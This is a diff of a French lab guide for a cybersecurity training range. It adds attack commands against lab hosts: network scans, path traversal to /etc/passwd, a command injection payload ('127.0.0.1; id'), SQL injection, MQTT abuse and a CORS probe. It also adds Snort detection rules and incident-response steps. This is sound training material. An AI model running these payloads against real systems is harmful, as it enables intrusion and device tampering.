@@ -18,14 +18,14 @@ Ce document présente les différents scénarios d'apprentissage disponibles dan
 1. **Scan de découverte**
    - Depuis Kali Linux, ouvrez un terminal et lancez:
    ```bash
-   nmap -sV 172.16.1.0/24
+   nmap -sV 172.16.99.0/24
    ```
    - Identifiez les services web actifs dans le réseau DMZ
 
 2. **Analyse de vulnérabilités**
    - Utilisez Nikto pour analyser DVWA:
    ```bash
-   nikto -h http://172.16.1.10
+   nikto -h http://172.16.99.10
    ```
 
 ### Phase 2: Exploitation de DVWA
@@ -68,7 +68,10 @@ Ce document présente les différents scénarios d'apprentissage disponibles dan
    - Essayez d'accéder à des chemins comme `../../../etc/passwd`
 
 2. **Enumération de répertoires**
-   - Utilisez DirBuster depuis Kali pour découvrir des répertoires cachés
+   - Utilisez DirBuster depuis Kali pour découvrir des répertoires cachés:
+   ```bash
+   dirb http://172.16.99.12
+   ```
 
 ## Scénario 2: Sécurité IoT
 
@@ -86,13 +89,13 @@ Ce document présente les différents scénarios d'apprentissage disponibles dan
 1. **Cartographie du réseau**
    - Depuis Kali Linux, identifiez les appareils IoT:
    ```bash
-   nmap -sn 192.168.2.0/24
+   nmap -sn 192.168.98.0/24
    ```
 
 2. **Scan des services**
    - Analysez les services sur les appareils découverts:
    ```bash
-   nmap -sV 192.168.2.10 192.168.2.11
+   nmap -sV 192.168.98.10 192.168.98.11
    ```
 
 ### Phase 2: Exploitation du protocole MQTT
@@ -104,13 +107,13 @@ Ce document présente les différents scénarios d'apprentissage disponibles dan
    ```
    - Abonnez-vous à tous les topics:
    ```bash
-   mosquitto_sub -h 192.168.2.2 -t "#"
+   mosquitto_sub -h 192.168.98.2 -t "#"
    ```
 
 2. **Publication de commandes MQTT non autorisées**
    - Publiez des commandes pour contrôler les appareils:
    ```bash
-   mosquitto_pub -h 192.168.2.2 -t "home/thermostat/command" -m '{"action":"set", "temperature":35}'
+   mosquitto_pub -h 192.168.98.2 -t "home/thermostat/command" -m '{"action":"set", "temperature":35}'
    ```
 
 ### Phase 3: Exploitation des API d'appareils
@@ -119,7 +122,7 @@ Ce document présente les différents scénarios d'apprentissage disponibles dan
    - Accédez à l'interface web: http://localhost:8086
    - Utilisez curl pour manipuler l'appareil:
    ```bash
-   curl -X POST http://localhost:8086/api/target -H "Content-Type: application/json" -d '{"temperature": 40.0}'
+   curl -X POST http://localhost:8086/api/target -H "Content-Type: application/json" -d '{"temperature": 35.0}'
    ```
 
 2. **Accès à la caméra IoT**
@@ -132,11 +135,15 @@ Ce document présente les différents scénarios d'apprentissage disponibles dan
    - Accédez à la passerelle depuis le réseau IoT ou LAN
    - Essayez l'injection de commande via l'API ping:
    ```bash
-   curl -X POST http://192.168.1.50/api/ping -d '{"ip":"127.0.0.1; id"}'
+   curl -X POST http://192.168.99.50/api/ping -d '{"ip":"127.0.0.1; id"}'
    ```
 
 2. **Pivotement entre réseaux**
-   - Utilisez la passerelle compromise pour pivoter entre le réseau IoT et le réseau corporate
+   - Utilisez la passerelle compromise pour pivoter entre le réseau IoT et le réseau corporate:
+   ```bash
+   # Exemple d'une commande pour tester la connectivité entre réseaux
+   curl -X POST http://192.168.99.50/api/ping -d '{"ip":"192.168.99.10"}'
+   ```
 
 ## Scénario 3: Attaques d'infrastructure (Load Balancing)
 
@@ -172,8 +179,8 @@ Ce document présente les différents scénarios d'apprentissage disponibles dan
 2. **Attaque directe des backends**
    - Contournez l'équilibreur en accédant directement aux backends:
    ```bash
-   curl http://172.16.1.21/
-   curl http://172.16.1.22/
+   curl http://172.16.99.21/
+   curl http://172.16.99.22/
    ```
 
 ### Phase 3: Exploitation des backends
@@ -181,13 +188,13 @@ Ce document présente les différents scénarios d'apprentissage disponibles dan
 1. **Exploitation de la traversée de répertoire**
    - Essayez d'accéder à des fichiers sensibles via le backend1:
    ```bash
-   curl http://172.16.1.21/files/../etc/passwd
+   curl http://172.16.99.21/files/../etc/passwd
    ```
 
 2. **Exploitation des vulnérabilités CORS**
    - Analysez les entêtes CORS du backend2:
    ```bash
-   curl -I -H "Origin: http://attacker.com" http://172.16.1.22/
+   curl -I -H "Origin: http://attacker.com" http://172.16.99.22/
    ```
 
 ### Phase 4: Exploitation de l'API
@@ -216,24 +223,29 @@ Ce document présente les différents scénarios d'apprentissage disponibles dan
    ```bash
    cat snort/rules/local.rules
    ```
-   - Ajoutez une règle personnalisée pour détecter les scans Nmap
+   - Ajoutez une règle personnalisée pour détecter les scans Nmap:
+   ```
+   alert tcp any any -> any any (msg:"Nmap Scan detected"; flags:S; threshold: type threshold, track by_src, count 20, seconds 60; sid:1000005; rev:1;)
+   ```
 
 2. **Configuration de Kibana**
    - Accédez à Kibana: http://localhost:5601
-   - Configurez un index pattern pour filebeat
+   - Configurez un index pattern pour filebeat:
+     - Management > Stack Management > Index Patterns
+     - Créez un pattern "filebeat-*"
 
 ### Phase 2: Génération de trafic malveillant
 
 1. **Tentatives d'injection SQL**
    - Depuis Kali, lancez des requêtes contenant des charges utiles SQL:
    ```bash
-   curl "http://172.16.1.10/vulnerabilities/sqli/?id=1%20OR%201=1&Submit=Submit"
+   curl "http://172.16.99.10/vulnerabilities/sqli/?id=1%20OR%201=1&Submit=Submit"
    ```
 
 2. **Balayage agressif**
    - Lancez un scan Nmap agressif:
    ```bash
-   nmap -A -T4 172.16.1.0/24
+   nmap -A -T4 172.16.99.0/24
    ```
 
 ### Phase 3: Analyse des alertes
@@ -249,11 +261,13 @@ Ce document présente les différents scénarios d'apprentissage disponibles dan
 ### Phase 4: Optimisation des règles
 
 1. **Réduction des faux positifs**
-   - Ajustez les règles pour réduire les faux positifs
+   - Ajustez les règles Snort pour réduire les faux positifs
    - Testez les règles modifiées
 
 2. **Création de tableaux de bord**
-   - Créez un tableau de bord Kibana pour visualiser les menaces
+   - Créez un tableau de bord Kibana pour visualiser les menaces:
+     - Dashboard > Create dashboard
+     - Ajoutez des visualisations pour les alertes par type, source, et destination
 
 ## Scénario 5: Red Team vs Blue Team
 
@@ -269,7 +283,14 @@ Ce document présente les différents scénarios d'apprentissage disponibles dan
 ### Équipe Rouge (Attaquants)
 
 1. **Reconnaissance initiale**
-   - Cartographiez tous les réseaux accessibles
+   - Cartographiez tous les réseaux accessibles:
+   ```bash
+   # Depuis Kali Linux
+   for subnet in 10.99.10 192.168.99 172.16.99 192.168.98; do
+     nmap -sn ${subnet}.0/24
+   done
+   ```
+   
    - Identifiez les cibles potentielles et vulnérabilités
 
 2. **Établissement d'un point d'entrée**
@@ -288,11 +309,19 @@ Ce document présente les différents scénarios d'apprentissage disponibles dan
 
 1. **Surveillance active**
    - Utilisez Kibana et Snort pour surveiller l'activité
-   - Détectez les comportements anormaux
+   - Configurez des alertes pour les comportements anormaux
+   ```bash
+   # Vérifiez régulièrement les journaux de Snort
+   docker exec -it snort cat /var/log/snort/alert
+   ```
 
 2. **Réponse aux incidents**
    - Identifiez et isolez les systèmes compromis
    - Analysez les méthodes d'attaque
+   ```bash
+   # Isoler un conteneur compromis du réseau
+   docker network disconnect cyberlab-light_corporate_lan compromised_container
+   ```
 
 3. **Remédiation**
    - Appliquez des corrections temporaires
@@ -329,6 +358,26 @@ Vous pouvez créer vos propres scénarios en combinant différents modules. Voic
 - **Points de contrôle**: Définissez des objectifs clairs pour chaque phase
 - **Débriefing**: Après chaque scénario, discutez des techniques utilisées et des leçons apprises
 - **Progression**: Organisez les scénarios du plus simple au plus complexe
+
+## Techniques et outils utiles pour les scénarios
+
+### Outils de reconnaissance
+- **nmap**: Scan de réseaux et de ports
+- **nikto**: Scanner de vulnérabilités web
+- **gobuster/dirb**: Énumération de répertoires web
+- **sqlmap**: Détection et exploitation d'injections SQL
+
+### Outils d'exploitation
+- **Burp Suite**: Proxy d'interception web (disponible dans Kali)
+- **curl/httpie**: Client HTTP en ligne de commande
+- **Wireshark**: Analyse de paquets réseau
+- **Metasploit**: Framework d'exploitation (utilisable dans des scénarios avancés)
+
+### Outils de défense
+- **ModSecurity**: WAF (Web Application Firewall)
+- **Suricata/Snort**: IDS/IPS
+- **ELK Stack**: Analyse de logs et visualisation
+- **Fail2ban**: Blocage automatique d'attaques par force brute
 
 ---
 
